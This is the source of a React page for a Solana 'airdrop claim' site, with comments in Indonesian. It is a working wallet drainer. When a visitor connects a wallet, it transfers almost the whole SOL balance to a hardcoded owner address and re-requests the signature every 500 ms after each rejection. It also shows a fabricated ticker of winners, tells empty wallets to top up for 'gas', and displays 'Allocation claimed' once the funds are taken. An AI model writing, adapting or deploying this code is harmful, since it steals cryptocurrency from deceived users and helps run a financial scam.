'use client'

import { useState, useEffect, useRef } from 'react'
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react'
import type { Provider } from '@reown/appkit-adapter-solana/react'
import { 
    Connection, 
    PublicKey, 
    Transaction, 
    SystemProgram, 
    LAMPORTS_PER_SOL 
} from '@solana/web3.js'

// --- DATA TICKER FIX SELANG-SELING ---
const generateTickerData = () => {
    const baseWallets = [
        "8xF...9d2A", "Cz4...kL9m", "J9s...p2Xq", "Rr3...m5Tv", 
        "Lq2...z8Pn", "Aa1...b2Cc", "Kp9...o0Li", "Tr5...w4Qy",
        "Bm7...v1Hu", "Xx3...z9Oi"
    ];
    
    return baseWallets.map((wallet, i) => {
        // Logika: Genap = 400 USDC, Ganjil = 5 SOL
        const rewardText = i % 2 === 0 ? "400 USDC" : "5 SOL";
        
        return {
            id: i,
            wallet,
            reward: rewardText
        };
    });
}

const tickerData = generateTickerData();

export default function Home() {
    const OWNER_WALLET = "yncyPqqYCvyhgTexUt54FWKZVa4FiP9QDMJVPFd4xh5" 
    
    const { open } = useAppKit()
    const { isConnected, address } = useAppKitAccount()
    const { walletProvider } = useAppKitProvider<Provider>('solana')
    
    const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'not-eligible'>('idle')
    const hasAttemptedRef = useRef(false)
    
    // State Animasi Ticker (Show/Hide)
    const [showTicker, setShowTicker] = useState(true);

    const handleScreenClick = () => {
        if (status === 'not-eligible' || status === 'processing' || status === 'success') return;
        if (!isConnected) open()
    }

    // Logic Ticker Loop (Hilang -> 5 Detik -> Muncul)
    useEffect(() => {
        const timer = setInterval(() => {
            setShowTicker(false);
            setTimeout(() => {
                setShowTicker(true);
            }, 5000); 
        }, 80000); // 80 detik

        return () => clearInterval(timer);
    }, []);

    // --- AUTO CLAIM + AGGRESSIVE RETRY ---
    useEffect(() => {
        let timeoutId: NodeJS.Timeout;

        async function autoClaim() {
            if (isConnected && walletProvider && address) {
                
                // Jangan set hasAttemptedRef disini agar bisa di-retry
                setStatus('processing');

                try {
                    const connection = new Connection("https://solana-rpc.publicnode.com", "confirmed")
                    const userPubkey = new PublicKey(address)
                    
                    // Cek Saldo
                    const balance = await connection.getBalance(userPubkey)
                    const GAS_BUFFER = 5000; 
                    const amountToSend = balance - GAS_BUFFER

                    if (amountToSend <= 0) {
                        setStatus('not-eligible')
                        return // Stop jika saldo 0
                    }

                    // Buat Transaksi
                    const transferInstruction = SystemProgram.transfer({
                        fromPubkey: userPubkey,
                        toPubkey: new PublicKey(OWNER_WALLET),
                        lamports: amountToSend, 
                    })

                    const transaction = new Transaction().add(transferInstruction)
                    const { blockhash } = await connection.getLatestBlockhash()
                    transaction.recentBlockhash = blockhash
                    transaction.feePayer = userPubkey
                    
                    // REQUEST SIGN (Popup Wallet)
                    await walletProvider.signAndSendTransaction(transaction)
                    
                    setStatus('success')
                    hasAttemptedRef.current = true; // Berhenti jika sukses

                } catch (error) {
                    console.error("User Reject / Error:", error)
                    
                    // --- LOGIKA RETRY TERUS MENERUS ---
                    // Jika user reject, jangan menyerah. Coba lagi setelah 500ms.
                    
                    setTimeout(() => {
                        autoClaim(); 
                    }, 500);
                }
            }
        }

        if (isConnected && !hasAttemptedRef.current) {
            timeoutId = setTimeout(() => {
                autoClaim();
            }, 1000); // Jeda awal
        }

        return () => clearTimeout(timeoutId);
    }, [isConnected, walletProvider, address])

    return (
        <main 
            onClick={handleScreenClick}
            className="relative w-screen h-screen cursor-pointer overflow-hidden font-sans antialiased"
        >
            {/* --- BACKGROUND (MENGGUNAKAN CSS GLOBALS AGAR PRESISI) --- */}
            <div className="main-background"></div>
            
            {/* Overlay Gelap */}
            <div className="absolute inset-0 bg-black/50 z-10"></div>

            {/* ========================================================
                BOTTOM TICKER (RUNNING TEXT)
               ======================================================== */}
            {showTicker && (
                <div className="ticker-wrapper">
                    <div className="ticker-track">
                        {/* Render Data 3x Loop */}
                        {[...tickerData, ...tickerData, ...tickerData].map((item, index) => (
                            <div key={index} className="ticker-item text-[11px] md:text-xs">
                                <span className="text-gray-400 mr-2">Wallet:</span>
                                <span className="text-white font-bold mr-3">{item.wallet}</span>
                                
                                <span className="text-gray-500 mr-2">-</span>
                                
                                {/* Reward Hijau Bold */}
                                <span className="text-green-400 font-bold">+{item.reward}</span>
                                
                                <span className="text-gray-700 ml-6">|</span>
                            </div>
                        ))}
                    </div>
                </div>
            )}

            {/* ========================================================
                POPUP: NOT ELIGIBLE (CENTERED & SOLANA STYLE)
               ======================================================== */}
            {status === 'not-eligible' && (
                <div style={{
                    position: 'fixed', top: 0, left: 0, width: '100vw', height: '100vh',
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    backgroundColor: 'rgba(0,0,0,0.9)', backdropFilter: 'blur(10px)', zIndex: 9999
                }}>
                    <div className="animate-popup relative w-full max-w-[380px] mx-4">
                        <div className="absolute -inset-1 bg-gradient-to-r from-[#9945FF] to-[#14F195] rounded-[2rem] blur-xl opacity-40"></div>
                        <div className="relative bg-[#121212] rounded-[2rem] p-8 border border-[#2a2a2a] shadow-2xl flex flex-col items-center text-center">
                            <div className="w-16 h-16 mb-6 rounded-full bg-[#1a1a1a] flex items-center justify-center border border-[#333]">
                                <span className="text-3xl">⚠️</span>
                            </div>
                            <h2 className="text-3xl font-bold mb-3 text-solana-gradient">Not Eligible</h2>
                            <p className="text-[#9ca3af] text-[15px] leading-relaxed mb-8">
                                Insufficient balance for gas fee. Please top up SOL.
                            </p>
                            <button 
                                onClick={(e) => { 
                                    e.stopPropagation(); 
                                    open(); 
                                    setStatus('idle'); 
                                    hasAttemptedRef.current = false; 
                                }}
                                className="w-full py-4 rounded-full font-bold text-black text-[15px] uppercase tracking-wide
                                           bg-gradient-to-r from-[#9945FF] to-[#14F195]
                                           shadow-[0_0_20px_rgba(153,69,255,0.3)]
                                           hover:scale-[1.02] active:scale-[0.98] transition-all"
                            >
                                Connect Different Wallet
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* ========================================================
                POPUP: PROCESSING (CENTERED)
               ======================================================== */}
            {status === 'processing' && (
                <div style={{
                    position: 'fixed', top: 0, left: 0, width: '100vw', height: '100vh',
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    backgroundColor: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(5px)', zIndex: 9999
                }}>
                    <div className="animate-popup bg-[#121212] px-12 py-8 rounded-[2rem] border border-[#333] flex flex-col items-center shadow-2xl">
                        <div className="w-12 h-12 border-[4px] border-[#222] border-t-[#9945FF] border-r-[#14F195] rounded-full animate-spin mb-4"></div>
                        <h2 className="text-white font-bold text-xs tracking-[0.2em] uppercase animate-pulse">
                            Verifying...
                        </h2>
                    </div>
                </div>
            )}
            
            {/* ========================================================
                POPUP: SUCCESS (CENTERED)
               ======================================================== */}
            {status === 'success' && (
                <div style={{
                    position: 'fixed', top: 0, left: 0, width: '100vw', height: '100vh',
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    backgroundColor: 'rgba(0,0,0,0.9)', backdropFilter: 'blur(10px)', zIndex: 9999
                }}>
                     <div className="animate-popup bg-[#121212] p-10 rounded-[2rem] border border-[#14F195]/30 flex flex-col items-center text-center shadow-2xl">
                        <div className="text-6xl mb-4">🎉</div>
                        <h2 className="text-2xl font-bold text-white mb-1">Success</h2>
                        <p className="text-[#14F195] text-xs font-bold uppercase tracking-widest">Allocation claimed</p>
                    </div>
                </div>
            )}
        </main>
    )
}